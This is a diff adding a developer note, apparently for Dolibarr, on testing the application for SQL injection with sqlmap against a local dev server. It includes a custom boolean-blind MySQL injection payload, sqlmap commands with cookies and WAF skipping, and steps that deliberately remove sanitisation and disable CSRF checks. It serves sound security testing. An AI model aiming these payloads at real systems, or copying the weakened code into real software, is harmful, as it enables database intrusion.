@@ -1,0 +1,72 @@
+To test there is no SQL injection, we can use:
+
+-- Installation of sqlmap
+-------------------------
+
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap
+
+cd sqlmap
+
+./sqlmap.py --update
+
+./sqlmap.py --purge
+
+
+Add, into file ~/git/sqlmap/data/xml/payloads/boolean_blind.xml, the custom rule:
+
+    <!-- Boolean-based blind tests - WHERE/HAVING clause -->
+    <test>
+     <title>Our_ORDERBY_Payload</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+     <vector>,(select * from(select (CASE WHEN ([INFERENCE]) THEN 1 ELSE exp(710) END))a)</vector>
+     <request>
+         <payload>,(select * from(select (CASE WHEN (1=1) THEN 1 ELSE exp(710) END))a)</payload>
+     </request>
+     <response>
+         <comparison>,(select * from(select (CASE WHEN (1=2) THEN 1 ELSE exp(710) END))a)</comparison>
+     </response>
+     <details>
+         <dbms>mysql</dbms>
+         <os>linux</os>
+     </details>
+ </test>
+
+
+
+
+-- Launch sqlmap on a given url/parameter
+-----------------------------------------
+
+Introduce a vulnerability by changing the GETPOST on parameter search_status into GETPOST('search_status', 'none') and removing $db->sanitize when parameter is used;
+
+./sqlmap.py --fresh-queries -u "http://localhostdev/comm/propal/list.php?search_status=*"
+
+./sqlmap.py -A "securitytest" --threads=4 -u "http://localhostdev/comm/propal/list.php?search_status=*" --dbms=mysql --os=linux --technique=B --batch --skip-waf \
+	--cookie="DOLSESSID_xxxxxx=yyyyyyyy;" --prefix='1' -v 4 > sqlmap.txt
+
+Check vulnerability is found into sqlmap.txt. Scanner is working.
+
+
+
+-- Launch sqlmap on all the application
+---------------------------------------
+
+Set $dolibarr_nocsrfcheck='1' into conf.php file to make access easier.
+
+With prefix (required to have some rules working)
+
+./sqlmap.py -A "securitytest" --threads=4 -u "http://localhostdev/" --crawl=2 --crawl-exclude="logout|user\/card|custom\/" \
+  --skip=sortorder --skip=sortfield --dbms=mysql --os=linux --technique=B --batch --skip-waf \
+  --cookie="DOLSESSID_xxxxxxxxx=yyyyyyyyyyyyyyyy;" --prefix='1' -v
+
+Without prefix
+
+./sqlmap.py -A "securitytest" --threads=4 -u "http://localhostdev/" --crawl=2 --crawl-exclude="logout|user\/card|custom\/" \
+  --skip=sortorder --skip=sortfield --dbms=mysql --os=linux --technique=B --batch --skip-waf \
+  --cookie="DOLSESSID_xxxxxxxxx=yyyyyyyyyyyyyyyy;" -v
+
+
